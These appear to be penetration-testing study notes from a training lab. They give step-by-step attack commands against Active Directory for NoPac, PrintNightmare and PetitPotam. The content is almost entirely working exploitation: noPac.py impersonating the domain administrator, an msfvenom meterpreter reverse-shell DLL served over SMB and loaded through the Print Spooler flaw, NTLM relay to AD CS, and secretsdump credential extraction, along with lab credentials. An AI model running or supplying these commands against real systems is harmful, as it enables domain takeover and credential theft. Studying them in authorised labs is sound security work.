# NoPac (SamAccountName Spoofing)
The vulnerability is the exploitation of CVE-2021-42278 and CVE-2021-42287 in Microsoft Active Directory environments that use Kerberos.

This vulnerability allows an attacker with standard domain user credentials to manipulate the sAMAccountName of a computer account and abuse Kerberos validation flaws to impersonate a Domain Controller and escalate privileges to Domain Admin, leading to full domain compromise.
Reconnaissance
```
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```
Exploit:
Try to confuse to the system with a ad account similiar (administrator$ with administrator) to get a TGT
- Reverse Shell
```
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```
- TGT
```
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```
# PrintNightmare
PrintNightmare exploits CVE-2021-34527 and CVE-2021-1675 in the Microsoft Windows Print Spooler, allowing remote code execution and privilege escalation in Active Directory environments.

- Reconnaissance about a print host
```
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```
- Creating the reverse shell and listener
```
# Payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

# SMB port
sudo smbserver.py -smb2support CompData /tmp/

# 8080 port open
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 172.16.5.225
set LPORT 8080
```
- Exploit
Try to upload the dll to print drivers
```
sudo python3 /opt/CVE-2021-1675/CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```
# PetitPotam (MS-EFSRPC)
PetitPotam (CVE-2021-36942) abuses a flaw in the Microsoft MS-EFSRPC protocol to coerce NTLM authentication from a Domain Controller, which can be relayed to Active Directory Certificate Services (AD CS) to obtain a certificate and impersonate the DC, leading to Domain Admin compromise.
Steps:
Running this tool like a listener in smb protocol
```
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```
Trigger coerced authentication with PetitPotam
```
python3 PetitPotam.py 172.16.5.225 172.16.5.5   
```
Request TGT using the obtained certificate in base64 (PKINIT)
```
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```
Get access
```
# Configurating the system with the certificate
export KRB5CCNAME=dc01.ccache
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
klist

# The key get when running gettgtpkinit.py, example:  INFO:minikerberos:6730b43f90c33d6d028a8842a94a44a73d1508ef7781500ad03dcd536f12954c
ython /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```
